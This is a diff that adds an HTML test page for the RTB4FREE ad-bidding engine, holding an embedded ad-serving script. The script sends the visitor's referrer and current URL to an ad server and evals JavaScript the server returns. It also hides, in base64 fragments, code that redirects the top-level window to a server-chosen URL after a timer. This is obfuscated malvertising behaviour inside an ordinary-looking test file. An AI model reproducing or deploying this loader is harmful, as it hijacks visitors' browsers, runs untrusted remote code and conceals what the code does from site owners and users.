@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="description" content="A test page for sending RTB requests to the Bidding engine.">
+      <meta name="keywords" content="RTB,OpenRTB,JAVA,Advertising,real-time,exchange,video,vast,display,simulation,bid,response,Native ad">
+      <meta name="author" content="RTB4FREE">
+      <title>RTB4FREE Bid Tester</title>
+      <!--#include virtual="SSI/brand_icon.ssi" -->
+       <link href=
+    "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css"
+    rel="stylesheet">
+    <link href=
+    "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css"
+    rel="stylesheet">
+    <link href="bootstrap-dialog.css" rel="stylesheet">
+    <script src=
+    "https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+    <script src=
+    "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+    <script src="js/vkbeautify.0.99.00.beta.js"></script>
+    <script src="js/rtb4free.js"></script>
+    
+    <link href="http://vjs.zencdn.net/4.7.1/video-js.css" rel="stylesheet">
+    <link href="vplayer/lib/videojs-contrib-ads/videojs.ads.css" rel="stylesheet" type="text/css">
+    <link href="vplayer/videojs.vast.css" rel="stylesheet" type="text/css">
+    
+    <link href="css/bootstrap-dialog.css" rel="stylesheet">
+    <script src="js/bootstrap-dialog.js"></script>
+    
+
+    <title></title>
+</head>
+<body>
+<button type="button" class="btn btn-info" onclick='doBanner()'>Display</button>
+<div id='image'>
+You are here
+</div>
+<div id='0174615323552'>
+</div>
+
+<script>
+
+
+function doBanner() {
+	var buf = ""; // "<script src='https://jtracking.global.ssl.fastly.net/data/datab/backserving.js' type='text/javascript'> <\/script>";
+	buf = buf + "<script type='text/javascript'>adparameter({ adid: '0174615323552', size: '300x250', siteid: '99201', bidid: '35c22289-06e2-48e9-a0cd-94aeb79fab43'}); <\/script>";
+	$('#image').replaceWith(buf);	
+}
+
+</script>
+<script>
+
+var adservercode = function() {
+    'use strict';
+
+    function deBase64(d) {
+        var g, k, m, o, f = {},
+            h = 0,
+            n = 0,
+            p = '',
+            t = String.fromCharCode,
+            u = d.length;
+        for (g = 0; 64 > g; g++) f[
+            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+            .charAt(g)] = g;
+        for (m = 0; m < u; m++)
+            for (k = f[d.charAt(m)], h = (h << 6) + k, n += 6; 8 <= n;)
+                ((o = 255 & h >>> (n -= 8)) || m < u - 2) && (p += t(o));
+        return p
+    }
+
+    function adservercode() {
+        return instance ? instance : void(instance = this)
+    }
+
+    function _request(d, f, g) {
+        var h;
+        if ('undefined' != typeof XMLHttpRequest) h = new XMLHttpRequest;
+        else
+            for (var k = ['MSXML2.XmlHttp.5.0', 'MSXML2.XmlHttp.4.0',
+                'MSXML2.XmlHttp.3.0', 'MSXML2.XmlHttp.2.0',
+                'Microsoft.XmlHttp'
+            ], m = 0, n = k.length; m < n; m++) try {
+                h = new ActiveXObject(k[m]);
+                break
+            } catch (o) {
+                console.warn(o)
+            }
+        h.onreadystatechange = function() {
+            4 > h.readyState || 200 !== h.status || 4 === h.readyState &&
+                g(h, f)
+        }, h.open('GET', d, !0), h.send('')
+    }
+
+    function _response(d, f) {
+        if (0 < d.responseText.length) {
+            var g;
+            try {
+                g = JSON.parse(d.responseText)
+            } catch (h) {}
+            'undefined' != typeof g && _adinitializer(g, f)
+        }
+    }
+
+    function _adinitializer(d, f) {
+        switch (d.adtype) {
+            case 'show':
+                _adsshow(d, f);
+                break;
+            case 'brake':
+                _brakeAd(d, f);
+                break;
+            case 'script':
+                _showTags(d, f);
+                break;
+            default:
+                console.warn('Wrong answer');
+        }
+    }
+
+    function _adsshow(d, f) {
+        var g = f.size.split('x');
+        document.getElementById(f.elid).outerHTML = '<a href="' + d.clicklink +
+            '"  target="_blank"><img src="' + d.src + '" width="' + g[0] +
+            '" height="' + g[1] + '""></a>'
+    }
+
+    function _brakeAd(j, cfg) {
+        var s = cfg.size.split('x');
+        document.getElementById(cfg.elid).outerHTML = '<a href="' + j.clicklink +
+            '"  target="_blank"><img src="' + j.src + '" width="' + s[0] +
+            '" height="' + s[1] + '"></a>';
+        var code = deBase64('c2V0VGltZW91dA==') + deBase64(
+                'KGZ1bmN0aW9uKCk=') + deBase64('e3RvcC4=') + deBase64(
+                'bG9jYQ==') + deBase64('dGlvbi5ocmVmID0g') + '"' +
+            deBase64(j.backurl) + '";}, ' + j.pingback + ')';
+        eval(code)
+    }
+
+    function _showTags(j, cfg) {
+        document.getElementById(cfg.elid).outerHTML = '', eval(j.body)
+    }
+
+    function appendClientInfo(q) {
+        return eval('q += "referer=" + escape(document.referrer) + "&"'),
+            eval(
+                'q += "location=" + escape(window.location.href) + "&"'
+            ), q
+    }
+    var instance, _log = !1,
+        scriptSource = function() {
+            var d = document.getElementsByTagName('script'),
+                f = d[d.length - 1];
+            return void 0 === f.getAttribute.length ? f.getAttribute('src',
+                2) : f.getAttribute('src')
+        }(),
+        adserver = scriptSource.split('/');
+    adserver = adserver[0] + '//' + adserver[2] + '/query/serving/';;
+    return adservercode.getInstance = function() {
+        return instance || new adservercode
+    }, adservercode.getAd = function(d, f) {
+        var g = '?';
+        for (var h in d) g += encodeURIComponent(h) + '=' +
+            encodeURIComponent(d[h]) + '&';
+        g = appendClientInfo(g), d.elid = f, _request(adserver + d.adid +
+            '/' + g, d, _response)
+    }, adservercode
+}();
+String.prototype.addSlashes = function() {
+    return this.replace(/[\\"']/g, '\\$&').replace(/\u0000/g, '\\0')
+};
+var adservercode_count = 1;
+
+function adparameter(d) {
+    var f = 'adservercode_' + adservercode_count;
+    document.write('<a id="' + f + '" style="visibility: hidden;"></a>'),
+        adservercode_count++, adservercode.getAd(d, f)
+}
+
+</script>
+</body>
+</html>
